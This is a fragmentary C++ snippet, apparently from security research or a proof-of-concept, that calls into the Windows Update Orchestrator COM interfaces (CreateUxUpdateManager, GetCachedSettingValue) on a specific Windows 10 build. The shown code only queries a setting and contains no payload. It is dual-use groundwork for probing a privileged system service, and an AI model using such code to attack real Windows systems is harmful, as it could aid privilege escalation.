...
ComPtr< IUxUpdateManager> IUxUpdateManager_obj;
HRESULT hr;
HSTRING st;
...
int wmain()
{
	...
	hr = IUpdateSessionOrchestrator_obj->CreateUxUpdateManager(&IUxUpdateManager_obj);
	if (FAILED(hr)) PrintError(__LINE__, hr);

	printf("[+] Get IUxUpdateManager_obj %p\n", IUxUpdateManager_obj.Get());
	// test in windows 10 2004 19041.450
	VARIANT p3;
	VariantInit(&p3);
	hr = IUxUpdateManager_obj->GetCachedSettingValue(0x57, VT_EMPTY,&p3);
	if (FAILED(hr)) PrintError(__LINE__, hr);
